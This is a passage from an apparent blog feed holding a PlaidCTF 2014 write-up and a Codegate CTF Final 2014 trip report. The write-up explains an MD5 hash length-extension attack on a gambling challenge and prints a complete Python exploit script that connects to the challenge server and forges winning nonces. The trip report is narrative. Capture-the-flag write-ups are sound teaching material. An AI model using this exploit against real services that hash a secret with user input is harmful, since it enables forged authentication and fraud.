<p>Studying the rules, we can see that, the smaller the odds, the more likely we can win. If we set odds to <code>1^2</code>, the chance to win will be a half. But we cannot bet the same nonce after winning.</p>

<p>So if we can figure out a way to always win, then we can double our balance each time, reaching a billion won&rsquo;t be a problem any more.</p>

<p>Since the md5 is calculated on <code>server_nonce + player_nonce</code>, and <code>server_nonce</code> won&rsquo;t change until you reveal it, and <code>player_nonce</code> is under our control, so we can easily think of the <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>.</p>

<p>However, to use <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>, we need the result of <code>md5(server_nonce + player_nonce)</code>. If we set odds to <code>1^100</code>, then we can get 100 bits of the md5 digest, how about the remaining 28 bits?</p>

<p>Since <code>2^28</code> is not a huge number, we can use brute-force. Here is the attack plan:</p>

<ol>
<li> Set our bet to 1$, odds to <code>2^100</code>, play a round, send &lsquo;a\n&rsquo;</li>
<li> It&rsquo;s mostly likely we will lose, never mind, grab the generated value, which should be sth like <code>0000000171ccbeef0869667267a6bbdd</code> in hex format.</li>
<li> Construct hash length attack padding suffix, play another round, send &lsquo;a\n&rsquo; + suffix + &lsquo;b\n&rsquo;, which would be sth like <code>a\n\x80\x00\x00......\x00\x90\x00\x00\x00\x00\x00\x00\x00b\n</code></li>
<li> And, not surprised, we lose again, never mind, grab the second generated value, which should be sth like <code>0000000f48eabc92e4b180a8d1b7c3d3</code> in hex format.</li>
</ol>


<p>OK, now we know</p>

<ol>
<li> <code>md5(server_nonce + 'a\n') == XXXXXX171ccbeef0869667267a6bbdd</code></li>
<li> <code>md5(server_nonce + 'a\n\x80\x00......\x00\x90\x00\x00\x00\x00\x00\x00\x00b\n' == YYYYYYf48eabc92e4b180a8d1b7c3d3</code></li>
<li> if we know the value of XXXXXXX, we can calculate YYYYYYf48eabc92e4b180a8d1b7c3d3 by hash length extention attack</li>
</ol>


<p>So just brute-force the value of XXXXXXX, and calculate the second md5 value, until we get the same suffix (f48eabc92e4b180a8d1b7c3d3).</p>

<p>After that, use hash extension attack again to search md5 hashes ending with bit 0, which is very easy. Send those winning nonce and get the flag!</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span> (parlor.py)</span> <a href='/downloads/code/plaidctf-2014-parlor-writeup/parlor.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/env python2</span>
</span><span class='line'><span class="c">#-*- coding:utf-8 -*-</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class='line'>
</span><span class='line'><span class="c"># https://github.com/zTrix/zio</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">md5_ext</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
</span><span class='line'>    <span class="n">tl</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x80</span><span class="s">&#39;</span>
</span><span class='line'>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span> <span class="o">!=</span> <span class="mi">56</span><span class="p">:</span>
</span><span class='line'>        <span class="n">ret</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">+=</span> <span class="n">l32</span><span class="p">(</span><span class="n">tl</span><span class="p">)</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">+=</span> <span class="n">l32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">a</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s">&#39;54.197.195.247&#39;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">4321</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;and 100):&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;we generated &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">remain1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="n">remain1_str</span> <span class="o">=</span> <span class="s">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">remain1</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">remain1</span><span class="p">,</span> <span class="n">remain1_str</span>
</span><span class='line'>
</span><span class='line'><span class="n">ext</span> <span class="o">=</span> <span class="n">md5_ext</span><span class="p">(</span><span class="s">&#39;k&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="s">&#39;b</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ext</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;we generated &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">remain2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="n">remain2_str</span> <span class="o">=</span> <span class="s">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">remain2</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">remain2</span><span class="p">,</span> <span class="n">remain2_str</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;the nonce has been &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nonce</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">log</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&#39;./search&#39;</span><span class="p">,</span> <span class="n">remain1_str</span><span class="p">,</span> <span class="n">remain2_str</span><span class="p">]),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">prefix</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;./search&#39;</span><span class="p">,</span> <span class="n">remain1_str</span><span class="p">,</span> <span class="n">remain2_str</span><span class="p">])</span>
</span><span class='line'><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span> <span class="o">==</span> <span class="mi">7</span>
</span><span class='line'>
</span><span class='line'><span class="n">first_md5</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="n">remain1_str</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;between 1 and 100):&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">log</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&#39;./even&#39;</span><span class="p">,</span> <span class="n">first_md5</span><span class="p">]),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">candi</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;./even&#39;</span><span class="p">,</span> <span class="n">first_md5</span><span class="p">])</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">candi</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span><span class='line'>    <span class="n">ary</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;, &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ary</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&#39;b&#39;</span><span class="p">:</span> <span class="k">continue</span>
</span><span class='line'>    <span class="n">ext</span> <span class="o">=</span> <span class="n">md5_ext</span><span class="p">(</span><span class="s">&#39;k&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">c</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">log</span><span class="p">(</span><span class="s">&#39;hash expectation: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">ary</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39; and &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">balance</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;):&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ext</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rs</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;====&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Too bad&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="k">elif</span> <span class="s">&#39;key&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Here is the command line output recorded by asciinema <a href="https://asciinema.org/a/8888">commandline output record</a></p>

<script type="text/javascript" src="https://asciinema.org/a/8888.js" id="asciicast-8888" async></script>


<p>Download source code here</p>

<ul>
<li><a href="/downloads/code/plaidctf-2014-parlor-writeup/parlor.py">attack script parlor.py</a></li>
<li><a href="/downloads/code/plaidctf-2014-parlor-writeup/search.cpp">search.cpp</a></li>
<li><a href="/downloads/code/plaidctf-2014-parlor-writeup/even.cpp">even.cpp</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Final 2014 Memory]]></title>
    <link href="http://blog.ztrix.me/blog/2014/04/10/codegate-ctf-final-2014-memory/"/>
    <updated>2014-04-10T23:48:01+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/04/10/codegate-ctf-final-2014-memory</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Last week, We represented team blue-lotus, consisting of me(zTrix), cbmixx, Aluex, Adrian, fqj and our beautiful photographer as well as translator, at Codegate CTF Finals 2014, in Seoul, South Korea. It&rsquo;s really a wonderful experience.</p>

<p>Since we are close to Seoul, we took off at April 1st, just one day before the game.</p>

<!-- more -->


<p>The good part of participating CTF offline final events in South Korea is, we are familiar with the culture, and only 1 hour time zone delta cause no jetlag at all. Besides, some of us took part in Secuinside Finals 2013, which was also in Seoul. So basically, things went very smoothly.</p>

<p>But still we have some problems, the biggest one was language. We knew nothing about Korean, and our translator as well as photographer, always told us to communicate by ourselves, unless necessary, she wouldn&rsquo;t help us. So we tried as hard as we could, using simple English words, gestures, even a little Japanese, and amazingly, Korean people could understand us!</p>

<p>The CTF game started at 2pm on April 2nd, and lasted 20 hours until 10 AM the next morning. All 14 teams (CLGT didn&rsquo;t manage to present) were in a large Hall room, with the organizers located at a corner.</p>

<p><img src="/images/codegate-ctf-final-2014-memory/cg.jpg" alt="/images/codegate-ctf-final-2014-memory/cg.jpg" /></p>

<p>Most of the TOP CTF teams such as <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>, <a href="http://mslc.ctf.su/">More Smoked Leet Chicken</a>, <a href="http://blog.dragonsector.pl">dragon sector</a> were in the competition. <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> sent the most powerful members, including the famous <a href="http://geohot.com/">geohot</a>. So even before the game, we could bet on <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>&rsquo;s winning of champion without hesitation.</p>

<p>A total of 15 problems were released one after another. Here are the problem list.</p>

<ul>
<li>RPG, web, 300</li>
<li>wsh, pwnable, 400</li>
<li>akkka, reversing, 300</li>
<li>running_danbi, mixed, 750</li>
<li>graynode, reversing, 800</li>
<li>TK, web, 200</li>
<li>pentester, logical + pwnable, 450</li>
<li>login page, web, 350</li>
<li>securepack, mixed, 350</li>
<li>trueman, web, 600</li>
<li>fortune teller, crypto + pwnable, 650</li>
<li>hexagrams, reversing, 600</li>
<li>virtual terminal, pwnable, 500</li>
<li>drupbox, pwnable, 400</li>
<li>webboard, web, 350</li>
</ul>


<p>So actually problems can be categoried into web (lots of SQL injection) and binary analysis (piggyback crypto, logical and pwnable elements).</p>

<p>From our point of view, the problems are hard and tricky, but not for <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>. At 14:55, only less than one hour from the beginning, the organizer announced first blood from <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>. After that, I can still remember they announced several first blood of <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>, especially for graynode, the problem with the highest score. Actually only <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> solved that problem thoughout the game. For us, we even didn&rsquo;t get any time on opening it.</p>

<p>We solved several web problems, and only one binary, the pentester, by me. The bug is a tricky logic error which could be called &ldquo;use before init&rdquo;. A buffer malloced from heap are created each time storing the password, but without initialization, which allow us to dump the admin password byte by byte. Although the problems are marked as &ldquo;Logical + Pwnable&rdquo;, it turned out there was nothing &ldquo;pwnable&rdquo; here, just exploiting the logic error was enough to score. I used my own crafted io library <a href="https://github.com/zTrix/zio">zio</a>, which was very handy, and I only took less than 10 minutes on writing exploitation code after identifying the bug.</p>

<p>Finally we ranked 8. We tried our best. And congratulations to <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>, <a href="http://mslc.ctf.su/">MSLC</a>, <a href="http://blog.dragonsector.pl">Dragon Sector</a>, <a href="http://eindbazen.net/">eindbazen</a>, you guys really rocks!</p>

<p><img src="/images/codegate-ctf-final-2014-memory/scoreboard.png" alt="/images/codegate-ctf-final-2014-memory/scoreboard.png" /></p>

<p>Note that <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> got more scores than the sum of 2nd and 3rd place.</p>

<p>There was an interesting network session after the CTF. We met a lot of interesting people. We met some members from <a href="https://ctftime.org/team/1816">pwnies</a>, they were very friendly. And their <a href="https://github.com/pwnies/pwntools">pwntools</a> is one of our favorite tools. Thanks for such great tool! We talked with the awesome <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> members, and got some clue on how they solved those hard problems. It&rsquo;s really great to meet those cool guys.</p>

<p>To conclude, I really appreciate this trip to South Korea participating such a great CTF. The problems were well prepared with very few defects, and the organizer provided network router, cable, switch, power socket, and even food. So we could focus on solving problems. Thank you for hosting. Looking forward to codegate CTFs in the future.</p>
]]></content>
  </entry>
  
</feed>
